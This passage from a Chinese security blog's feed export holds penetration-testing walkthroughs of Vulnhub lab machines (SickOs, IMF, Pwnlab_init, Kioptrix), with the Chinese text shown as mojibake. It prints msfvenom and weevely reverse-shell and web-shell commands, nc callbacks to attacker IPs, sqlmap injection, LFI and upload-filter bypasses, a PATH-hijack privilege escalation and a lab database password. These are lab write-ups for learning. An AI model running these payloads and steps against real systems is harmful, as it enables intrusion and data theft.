<p><img src="/2020/03/15/SickOs1-2/image-20200315190529395.png" alt="image-20200315190529395"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315190947639.png" alt="image-20200315190947639"></p>
<h1 id="0x02-ææƒ"><a href="#0x02-ææƒ" class="headerlink" title="0x02 ææƒ"></a><strong>0x02 ææƒ</strong></h1><p>è¿˜æ˜¯è€è§„çŸ©msfèµ°èµ·</p>
<p>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=443 &gt;/root/shell_443.php<br>ç”¨ä¸­å›½èšå‰‘ä¸Šä¼ ä¸Šå» æœ¬åœ°ç›‘å¬ æ‹¿åˆ°shell</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315201428099.png" alt="image-20200315201428099"></p>
<p>shellæ”¾åˆ°åå° search chkrootokitçš„expç„¶ååŠ è½½åˆ°åå°shellé‡Œ<br>æ³¨æ„è¿™æ—¶å€™443ä¼šè¢«é‡ç½®ä¸ºexpé‡Œè®¾å®šçš„4444<br>ç”±äºé¶æœºé˜²ç«å¢™ä¸å…è®¸éå¸¸ç”¨ç«¯å£çš„ä½¿ç”¨æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨443æ¥æ“ä½œ<br>é‡æ–°set lport 443</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315201530617.png" alt="image-20200315201530617"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315201742942.png" alt="image-20200315201742942"></p>
<p>æ‹¿åˆ°rootï¼</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>SickOs1.1</title>
    <url>/2020/03/15/SickOs1-1/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p><img src="/2020/03/15/SickOs1-1/image-20200315143529889.png" alt="image-20200315143529889"></p>
<p>3128æœ‰ä»£ç†  niktoæ‰«ä¸€ä¸‹</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145113192.png" alt="image-20200315145113192"></p>
<p>ç”¨niktoæ‰«æå‡ºå¾ˆå¤šä¿¡æ¯â€¦é€éœ²äº†/cgi-bin/statusä½ç½®ï¼ˆå®¹æ˜“å—åˆ°shellshockæ”»å‡»ï¼‰ï¼Œè¿™è¾¹è¿˜å­˜åœ¨robots.txt ï¼Œè®¿é—®ä¸‹robotsæŒ‚ä¸Šä»£ç†ï¼Œæˆ‘ç”¨çš„è°·æ­Œæ’ä»¶</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145554846.png" alt="image-20200315145554846"></p>
<p>è®¿é—®ä¸‹80 æ ¹æ®æç¤ºåœ¨è®¿é—®ä¸‹wolfcms</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145611556.png" alt="image-20200315145611556"></p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145646346.png" alt="image-20200315145646346"></p>
<p>ç½‘ä¸Šæœåˆ°è¿™ä¸ªcmsçš„ç™»é™†ç•Œé¢æ˜¯<a href="http://192.168.0.103/wolfcms/?/admin/login" target="_blank" rel="noopener">http://192.168.0.103/wolfcms/?/admin/login</a></p>
<p>admin adminå¼±å£ä»¤è¿›å»</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315150009521.png" alt="image-20200315150009521"></p>
<p>æˆ‘ä»¬çœ‹åˆ°äº†è¿™é‡Œæœ‰ä¸Šä¼ é¡µé¢ æ¥ä¸‹æ¥å°±æ˜¯åšä¸ªé©¬ä¸Šä¼ ææƒï¼Œå¤§æ¦‚å°±æ˜¯è¿™æ ·äº†</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315150043417.png" alt="image-20200315150043417"></p>
<h1 id="0x01-æ–‡ä»¶ä¸Šä¼ "><a href="#0x01-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x01 æ–‡ä»¶ä¸Šä¼ "></a><strong>0x01 æ–‡ä»¶ä¸Šä¼ </strong></h1><p><img src="/2020/03/15/SickOs1-1/image-20200315150534277.png" alt="image-20200315150534277"></p>
<p>msfæ¥ pythonè·å–tty æˆ‘ä»¬ç°åœ¨å—ä¼¤å·²ç»æœ‰wwwæƒé™äº† é‚£ä¹ˆå°±æ˜¯ææƒäº†æ¥ä¸‹æ¥<br><img src="/2020/03/15/SickOs1-1/image-20200315152344144.png" alt="image-20200315152344144"></p>
<h1 id="0x02-ææƒ"><a href="#0x02-ææƒ" class="headerlink" title="0x02 ææƒ"></a><strong>0x02 ææƒ</strong></h1><p>äº†è§£ä¸‹ç«™ç‚¹ç»“æ„ æ‰¾åˆ°config.phpå¯»æ‰¾å¯†ç </p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315152649835.png" alt="image-20200315152649835"></p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315152718022.png" alt="image-20200315152718022"></p>
<p>ç›´æ¥rootä¸è¡Œ äº†è§£åˆ°passwdæ–‡ä»¶é‡Œçš„æç¤º sickosæ˜¯ç¬¬ä¸€ç”¨æˆ· ç›´æ¥suè¿‡å»</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315152900190.png" alt="image-20200315152900190"></p>
<p>æƒé™è¿˜æ˜¯ä¸å¯¹ å†sudo -i å¯ä»¥äº† </p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315153249332.png" alt="image-20200315153249332"></p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315153348379.png" alt="image-20200315153348379"></p>
<p>ç¬¬ä¸€å…³é€šè¿‡ï¼</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>IMF</title>
    <url>/2020/03/14/IMF/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p><img src="/2020/03/14/IMF/image-20200314185633352.png" alt="image-20200314185633352"></p>
<p>å°±ä¸€ä¸ª80</p>
<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>çœ‹æºç å°±è¡Œäº†</p>
<p><img src="/2020/03/14/IMF/image-20200314185815358.png" alt="image-20200314185815358"></p>
<p>base64è§£è¿™ä¸ªflag æç¤ºæˆ‘ä»¬allthefiles<img src="/2020/03/14/IMF/image-20200314185917680.png" alt="image-20200314185917680"></p>
<h1 id="0x02-flag2"><a href="#0x02-flag2" class="headerlink" title="0x02 flag2"></a><strong>0x02 flag2</strong></h1><p>æˆ‘ä»¬å†ç»†çœ‹ è¿™å‡ è¡Œjsæœ‰ç‚¹æ€ª æ‹¼èµ·æ¥å¾—åˆ°flag2 æç¤ºimfadministrator</p>
<p><img src="/2020/03/14/IMF/image-20200314190308552.png" alt="image-20200314190308552"></p>
<p><img src="/2020/03/14/IMF/image-20200314190426313.png" alt="image-20200314190426313"></p>
<p><img src="/2020/03/14/IMF/image-20200314190511844.png" alt="image-20200314190511844"></p>
<h1 id="0x03-flag3"><a href="#0x03-flag3" class="headerlink" title="0x03 flag3"></a><strong>0x03 flag3</strong></h1><p>æ ¹æ®ç»™çš„è·¯å¾„å‘ç°ç™»é™†é¡µé¢<br>æ ¹æ®å›æ˜¾å‘ç°rmichaelsç”¨æˆ·åå­˜åœ¨<br>æŸ¥çœ‹æºç å‘ç°å¯†ç ä½¿ç”¨ç¡¬ç¼–ç <br>å¦‚æœæ˜¯ç¡¬ç¼–ç çš„ï¼Œæˆ‘ä»¬çŒœæµ‹ä»–ä½¿ç”¨äº†strcmpå‡½æ•°ï¼Œstrcmp()æ˜¯å¯¹äºç›¸ç­‰çš„å­—ç¬¦ä¸²è¿”å›0ï¼Œä¸åŒçš„å­—ç¬¦ä¸²è¿”å›é0ï¼Œä½†å¦‚æœæ¯”è¾ƒéå­—ç¬¦ä¸²ï¼Œstrcmp()å°†è¿”å›nullã€‚åœ¨phpä¸­null==0æ˜¯trueã€‚ä½¿å¾—æ•°ç»„çœ‹èµ·æ¥ä¸ç¡¬ç¼–ç çš„å¯†ç å­—ç¬¦ä¸²åŒ¹é…ã€‚<br>æ‰€ä»¥æˆ‘ä»¬æ­¤å¤„ä¼ ä¸€ä¸ªæ•°ç»„ï¼Œå°†passå­—æ®µé‡å‘½åä¸ºpass[]ã€‚<br>ç”¨æˆ·åä½¿ç”¨rmichaelsï¼Œå°†passå­—æ®µé‡å‘½åä¸ºpass[]ã€‚</p>
<p><img src="/2020/03/14/IMF/image-20200314220716954.png" alt="image-20200314220716954"></p>
<p><img src="/2020/03/14/IMF/image-20200314220834567.png" alt="image-20200314220834567"></p>
<p><img src="/2020/03/14/IMF/image-20200314220905157.png" alt="image-20200314220905157"></p>
<h1 id="0x04-flag4"><a href="#0x04-flag4" class="headerlink" title="0x04 flag4"></a><strong>0x04 flag4</strong></h1><p>è¿›åˆ°IMFé‡Œpagenameå‚æ•°æœ‰ä¸ªuploadæœ‰æ³¨å…¥ sqlmapèµ°èµ·</p>
<p><img src="/2020/03/14/IMF/image-20200314221515461.png" alt="image-20200314221515461"></p>
<p>sqlmap -u â€œ<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> â€“cookie â€œPHPSESSID=dfij6638dhhltl0vplg5q71um3â€ â€“dbs</p>
<p><img src="/2020/03/14/IMF/image-20200314222022401.png" alt="image-20200314222022401"></p>
<p>è·‘admin<br>sqlmap -u â€œ<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> â€“cookie â€œPHPSESSID=dfij6638dhhltl0vplg5q71um3â€ -D admin â€“tables<br><img src="/2020/03/14/IMF/image-20200314222132550.png" alt="image-20200314222132550"></p>
<p>æ–°é¡µé¢<br><img src="/2020/03/14/IMF/image-20200314222241091.png" alt="image-20200314222241091"></p>
<p><img src="/2020/03/14/IMF/image-20200314222527908.png" alt="image-20200314222527908"></p>
<p>æ‰«æ‰«æ›´å¥åº·</p>
<p><img src="/2020/03/14/IMF/image-20200314233209089.png" alt="image-20200314233209089"></p>
<p>è§£ç <br><img src="/2020/03/14/IMF/image-20200314222659426.png" alt="image-20200314222659426"></p>
<h1 id="0x05-flag5"><a href="#0x05-flag5" class="headerlink" title="0x05 flag5"></a><strong>0x05 flag5</strong></h1><p>è®¿é—®ä¸‹è§£ç åçš„php</p>
<p><img src="/2020/03/14/IMF/image-20200314222754725.png" alt="image-20200314222754725"></p>
<p>äº²è‡ªè¯•æ°´ å¸¸è§„ä¸Šä¼ åˆ«è¯•äº† ä¸Šweevelyå§<br>weevely generate t00r ~/shell.php<br><img src="/2020/03/14/IMF/image-20200314223138650.png" alt="image-20200314223138650"><br>æ”¹ä¸ªæ–‡ä»¶å¤´ æ–‡ä»¶åç¼€ä¹Ÿå˜gif<br><img src="/2020/03/14/IMF/image-20200314223316403.png" alt="image-20200314223316403"><br>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="/2020/03/14/IMF/image-20200314224722194.png" alt="image-20200314224722194"></p>
<p>æºç é‡Œè¿™ä¸ªå°±æ˜¯æ–‡ä»¶è½åœ°åçš„åå­—<br><img src="/2020/03/14/IMF/image-20200314225025848.png" alt="image-20200314225025848"></p>
<p>è¿æ¥åæŸ¥çœ‹flag5 è§£ç <br><img src="/2020/03/14/IMF/image-20200314225510979.png" alt="image-20200314225510979"><br>æç¤ºagentservices</p>
<h1 id="0x06-flag6"><a href="#0x06-flag6" class="headerlink" title="0x06 flag6"></a><strong>0x06 flag6</strong></h1><p>ncå»å¼„ä¸ªäº¤äº’å¼shell<br>æ”»å‡»æœºï¼šnc -lvp 2333<br>é¶æœºï¼š:backdoor_reversetcp 192.168.0.106 2333<br><img src="/2020/03/14/IMF/image-20200314230121345.png" alt="image-20200314230121345"></p>
<p>ps -auxçœ‹çœ‹è¿›ç¨‹ å‘ç°æœ‰knockè¿›ç¨‹æ€ªä¸å¾—å¼€å§‹ä¿¡æ¯æ”¶é›†æ—¶å€™åªæœ‰80ç«¯å£<br><img src="/2020/03/14/IMF/image-20200314230358950.png" alt="image-20200314230358950"><br>å†çœ‹çœ‹ç½‘ç»œ netstat -antp å‘ç°ä¸ª7788</p>
<p><img src="/2020/03/14/IMF/image-20200314230649667.png" alt="image-20200314230649667"></p>
<p>è¿›ä¸€æ­¥äº†è§£ä¸‹ ä¹‹å‰çš„flag5æç¤ºæˆ‘ä»¬ä¹Ÿæ˜¯ä»£ç†</p>
<p><img src="/2020/03/14/IMF/image-20200314230734515.png" alt="image-20200314230734515"></p>
<p>findå…¨å±€æŸ¥agentæ–‡ä»¶ æ‰“å¼€ä¸¤ä¸ª</p>
<p><img src="/2020/03/14/IMF/image-20200314231323432.png" alt="image-20200314231323432"></p>
<p>æ ¹æ®æ•²é—¨å¯†ç  æ•²ç«¯å£</p>
<p><img src="/2020/03/14/IMF/image-20200314232557766.png" alt="image-20200314232557766"></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnlab_init</title>
    <url>/2020/03/12/Pwnlab-init/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p><img src="/2020/03/12/Pwnlab-init/image-20200312222253552.png" alt="image-20200312222253552"></p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312222520688.png" alt="image-20200312222520688"></p>
<p>å‘ç°80ç«¯å£çš„urlæ˜¯è¿™æ ·çš„</p>
<p> <a href="http://192.168.0.104/?page=login" target="_blank" rel="noopener">http://192.168.0.104/?page=login</a><br> <a href="http://192.168.0.104/?page=upload" target="_blank" rel="noopener">http://192.168.0.104/?page=upload</a></p>
<ol>
<li>å¯èƒ½å­˜åœ¨ LFI æ¼æ´</li>
<li>æ„é€ URL <a href="http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login" target="_blank" rel="noopener">http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login</a></li>
<li>å‘ç°å¯ä»¥åŒ…å«è¯»åˆ°æ–‡ä»¶ï¼Œç„¶åbase64è§£å¯†</li>
</ol>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312223045306.png" alt="image-20200312223045306"></p>
<p>ä»£ç å¦‚ä¸‹</p>
<p>â€”login.phpâ€”</p>
<p><code>&lt;?php
session_start();require(&quot;config.php&quot;);server, password, $database);if (isset(POST[&#39;pass&#39;]))
{
    POST[&#39;user&#39;];
    _POST[&#39;pass&#39;]);$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;);
$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);
$stmt-&gt;execute();
$stmt-&gt;store_Result();
if ($stmt-&gt;num_rows == 1)
{
    $_SESSION[&#39;user&#39;] = $luser;
    header(&#39;Location: ?page=upload&#39;);
}
else
{
    echo &quot;Login failed.&quot;;
}    &lt;?php
}Username: 
Password: 
}
else
{
    ?&gt;</code></p>
<p>è·Ÿç€å†æŠŠ<code>require</code>ä¸­çš„configè¯»å‡ºæ¥</p>
<p><code>&lt;?php
$server   = &quot;localhost&quot;;
$username = &quot;root&quot;;
$password = &quot;H4u%QJ_H99&quot;;
$database = &quot;Users&quot;;
?&gt;%</code></p>
<p>é¡ºä¾¿ä¹ŸæŠŠindexå’Œuploadçš„ä¹Ÿè¯»äº†</p>
<p>â€”indexâ€”</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312234059880.png" alt="image-20200312234059880"></p>
<p>â€”uploadâ€”</p>
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>

<?php 
if(isset($_POST['submit'])) {
    if ($_FILES['file']['error'] <= 0) {
        $filename  = $_FILES['file']['name'];
        $filetype  = $_FILES['file']['type'];
        $uploaddir = 'upload/';
        $file_ext  = strrchr($filename, '.');
        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
        $whitelist = array(".jpg",".jpeg",".gif",".png"); 


    if (!(in_array($file_ext, $whitelist))) {
        die('Not allowed extension, please upload images only.');
    }

    if(strpos($filetype,'image') === false) {
        die('Error 001');
    }

    if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
        die('Error 002');
    }

    if(substr_count($filetype, '/')>1){
        die('Error 003');
    }

    $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
        echo "<img src="/2020/03/12/Pwnlab-init/"".$uploadfile."\""><br>";
    } else {
        die('Error 4');
    }
}
}

?><p>%</p>
<p>åœ¨ä¸Šé¢å·²ç»æ‹¿åˆ°äº†MySQLçš„è´¦å·å¯†ç äº†ï¼Œè€Œä¸”åœ¨ç”¨nmapæ‰«çš„æ—¶å€™å·²ç»å‘ç°3306ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚</p>
<p>mysql -h 192.168.0.104 -u root -D Users -på¯†ç æ˜¯configæ–‡ä»¶çš„é‚£ä¸ª</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312224817346.png" alt="image-20200312224817346"></p>
<p>æ‹¿åˆ°ç”¨æˆ·å</p>
<h1 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a><strong>0x01 Bypass</strong></h1><p>ç™»å½•ä¸Šä¼ æ–‡ä»¶è¯•è¯•ï¼Œä¸Šé¢çš„æºç å·²ç»çŸ¥é“åªèƒ½ä¸Šä¼ å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œè€Œä¸”è¿˜åˆ¤äº†æ–‡ä»¶ç±»å‹å’Œmime</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312225323119.png" alt="image-20200312225323119"></p>
<p>åŠ ä¸ªå›¾ç‰‡æ ‡å¿—ç»•è¿‡</p>
<p>burpä¸Šä¼ å›æ¥ä¸ªç›¸å¯¹è·¯å¾„ upload/51c65dd716e81189745d6eb1c9f1bb6b.gif</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312230453184.png" alt="image-20200312230453184"></p>
<p>è®©ä»–å¼¹å›æ¥ ç”¨cookieä¼ å…¥è·¯å¾„</p>
<p>curl â€“cookie â€œlang=../upload/51c65dd716e81189745d6eb1c9f1bb6b.gifâ€ â€œ<a href="http://192.168.0.104&quot;" target="_blank" rel="noopener">http://192.168.0.104&quot;</a></p>
<p>æ‹¿åˆ°äº†</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312231440117.png" alt="image-20200312231440117"></p>
<p>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™ è·å–ä¸€ä¸ªtty</p>
<p>ç”¨ä¹‹å‰æ•°æ®åº“é‡Œæ‹¿åˆ°çš„ä¸‰ä¸ªè´¦å·å°è¯•ç™»é™†</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312231648685.png" alt="image-20200312231648685"></p>
<h1 id="0x02-ææƒ"><a href="#0x02-ææƒ" class="headerlink" title="0x02 ææƒ"></a><strong>0x02 ææƒ</strong></h1><p>æ€è·¯æ˜¯è¿™æ ·çš„</p>
<p>1.ä»æˆªå›¾å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ªELF 32ä½ LSBæ‰§è¡Œæ–‡ä»¶ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼ŒæŠ¥é”™äº†</p>
<p>2.é€šè¿‡æŠ¥é”™ä¿¡æ¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°msgmikeè°ƒç”¨catå‘½ä»¤è¯»å–/home/mike/msg.txtæ–‡ä»¶</p>
<p>é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®bashçš„$pathç¯å¢ƒå˜é‡æ¥åˆ©ç”¨</p>
<p>3.ç„¶è€Œå½“æˆ‘ä»¬è°ƒç”¨catå‘½ä»¤çš„æ—¶å€™ï¼Œcatä¼šä»ä»¥ä¸Šç›®å½•æ¥å¯»æ‰¾ï¼Œå¦‚æœæˆ‘ä»¬æ·»åŠ .åˆ°$PATHç¯å¢ƒå˜é‡ï¼Œ</p>
<p>4.åˆ™ä¼šå…ˆä»å½“å‰ç›®å½•æ¥å¯»æ‰¾catæŒ‡ä»¤ï¼Œç›¸å½“äºæˆ‘ä»¬è‡ªå·±åˆ›å»ºä¸€ä¸ªè¯»æ–‡ä»¶çš„catæŒ‡ä»¤ï¼Œç”¨è¿™ä¸ªæŒ‡ä»¤æ¥</p>
<p>5.è¯»æ–°å»ºå–/home/mike/msg.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªcatæ–‡ä»¶ï¼Œå¹¶æ·»åŠ æ‰§è¡Œæƒé™</p>
<p>6.è¿™æ ·å½“æˆ‘ä»¬å†æ¬¡è¿è¡Œ./msgmikeå‘½ä»¤çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘å½“å‰ç›®å½•ä¸‹çš„cat(/bin/sh)ï¼Œ</p>
<p>æˆ‘ä»¬å°±ä¼šæå‡åˆ°mikeæƒé™</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312232750822.png" alt="image-20200312232750822"></p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312232900069.png" alt="image-20200312232900069"></p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312232907099.png" alt="image-20200312232907099"></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrixå…¨é›†</title>
    <url>/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/</url>
    <content><![CDATA[<h1 id="0x00-Kioptrix-Level-1"><a href="#0x00-Kioptrix-Level-1" class="headerlink" title="0x00 Kioptrix_Level_1"></a><strong>0x00 Kioptrix_Level_1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307161830148.png" alt="image-20200307161830148"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307162355257.png" alt="image-20200307162355257"></p>
<p>åˆ©ç”¨Sambaæº¢å‡º</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307165821506.png" alt="image-20200307165821506"></p>
<p>è¿˜å¯ä»¥åˆ©ç”¨Apache OpenSSLæ¼æ´æº¢å‡ºï¼Œä¸å±•ç¤ºäº†ã€‚</p>
<h1 id="0x01-Kioptrix-Level-1-1"><a href="#0x01-Kioptrix-Level-1-1" class="headerlink" title="0x01 Kioptrix_Level_1.1"></a><strong>0x01 Kioptrix_Level_1.1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170524511.png" alt="image-20200307170524511"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170918034.png" alt="image-20200307170918034"></p>
<p>80çš„index.php webåŸºç¡€è€ƒè¯•æ¥äº† æƒ³èµ·äº†è€ƒpteçš„æ—¶å€™</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171747660.png" alt="image-20200307171747660"></p>
<p>å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171841255.png" alt="image-20200307171841255"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171849863.png" alt="image-20200307171849863"></p>
<p>é‚£ä¸å®¢æ°”äº† bashå¼¹shell æ³¨æ„ï¼›å› ä¸ºå‰é¢çš„æ˜¯ping</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172121951.png" alt="image-20200307172121951"></p>
<p>ncæ¥åˆ°</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172251783.png" alt="image-20200307172251783"></p>
<p>ææƒ çœ‹ä¸‹ç‰ˆæœ¬</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172603208.png" alt="image-20200307172603208"></p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°äº†exploitdbçš„ <a href="https://www.exploit-db.com/download/9542" target="_blank" rel="noopener">https://www.exploit-db.com/download/9542</a></p>
<p>python3 -m http.server 9999 å¼€ä¸ªhttp</p>
<p>ç¼–è¯‘å‘½ä»¤gcc -o 9542 9542.c</p>
<p>è®°å¾—åœ¨tmpå› ä¸ºæœ‰æ‰§è¡Œæƒé™è¿™ç›®å½• æºæ–‡ä»¶ä¸‹è½½ä¸‹æ¥åç¼€æ”¹æˆ.cç¼–è¯‘å®Œå°±æ˜¯9542äº†</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307173559780.png" alt="image-20200307173559780"></p>
<p>é—¯å…³æˆåŠŸï¼</p>
<h1 id="0x02-Kioptrix-Level-1-2"><a href="#0x02-Kioptrix-Level-1-2" class="headerlink" title="0x02 Kioptrix_Level_1.2"></a><strong>0x02 Kioptrix_Level_1.2</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307174435555.png" alt="image-20200307174435555"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307175301323.png" alt="image-20200307175301323"></p>
<p>åˆ©ç”¨æ–¹å¼å¾ˆå¤š</p>
<ul>
<li>Gallarific<ul>
<li>gallery.php SQL Injection</li>
</ul>
</li>
<li>LotusCMS<ul>
<li>RCE</li>
<li>Code Inject</li>
</ul>
</li>
</ul>
<p>dirbå¼€å§‹ æ‰«å‡ºæŒºå¤š</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307180238145.png" alt="image-20200307180238145"></p>
<p>åšä¸‹host</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181159138.png" alt="image-20200307181159138"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181450474.png" alt="image-20200307181450474"></p>
<p>msfæˆ‘ä»¬ç”¨å¤ªå¤šäº† oscpè€ƒè¯•é™åˆ¶msfä½¿ç”¨çš„ é‚£ä¹ˆè¿™æ¬¡æˆ‘ä»¬ä»SQL Injectionå…¥æ‰‹</p>
<p>åœ¨exploit-dbä¸Šæœç´¢Gallarificçš„æ¼æ´</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181638504.png" alt="image-20200307181638504"></p>
<p>æ³¨å…¥ç‚¹ï¼š<a href="http://www.site.com/gallery.php?id=null" target="_blank" rel="noopener">www.site.com/gallery.php?id=null</a></p>
<p>sqlmapè·‘è¿™ä¸ª <a href="http://192.168.0.106/gallery/gallery.php?id=1" target="_blank" rel="noopener">http://192.168.0.106/gallery/gallery.php?id=1</a></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181924830.png" alt="image-20200307181924830"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183256152.png" alt="image-20200307183256152"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183221579.png" alt="image-20200307183221579"></p>
<p>å¾ˆä¹…æ²¡å‡çº§sqlmapäº†â€¦.</p>
<p>md5è§£å®Œå°±æ˜¯Mast3rå’Œstarwars</p>
<p>loneferret / starwars 22èµ°ä¸€æ³¢ </p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183819289.png" alt="image-20200307183819289"></p>
<p>æ ¹æ®æç¤º sudo ht</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185119942.png" alt="image-20200307185119942"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307184036261.png" alt="image-20200307184036261"></p>
<p>æŒ‰F3 æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ /etc/passwd(æˆ–è€…/etc/sudoers) ç¼–è¾‘loneferrté‚£ä¸€è¡ŒæŠŠ1000å’Œ100 åˆ†åˆ«æ”¹ä¸º0ï¼ŒCTRL+W ä¿å­˜ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185258898.png" alt="image-20200307185258898"></p>
<p>ææƒæˆåŠŸ</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185504768.png" alt="image-20200307185504768"></p>
